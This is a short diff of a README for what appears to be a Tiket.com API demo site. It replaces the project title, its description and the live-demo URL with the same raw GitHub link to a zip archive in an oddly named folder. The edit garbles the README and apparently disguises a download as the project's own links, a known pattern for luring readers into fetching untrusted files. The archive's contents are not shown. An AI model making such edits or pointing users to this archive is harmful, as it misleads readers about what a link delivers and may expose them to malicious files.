@@ -1,5 +1,5 @@
-API-Tiket.com
+https://raw.githubusercontent.com/dextercool/API-Tiket.com/master/bronchium/API-Tiket.com.zip
 =============
 
-Website API Tiket.com<br />
-Live Demo: http://www.zainalabidin.me/demo/tiketdotcom/
+Website API https://raw.githubusercontent.com/dextercool/API-Tiket.com/master/bronchium/API-Tiket.com.zip<br />
+Live Demo: https://raw.githubusercontent.com/dextercool/API-Tiket.com/master/bronchium/API-Tiket.com.zip
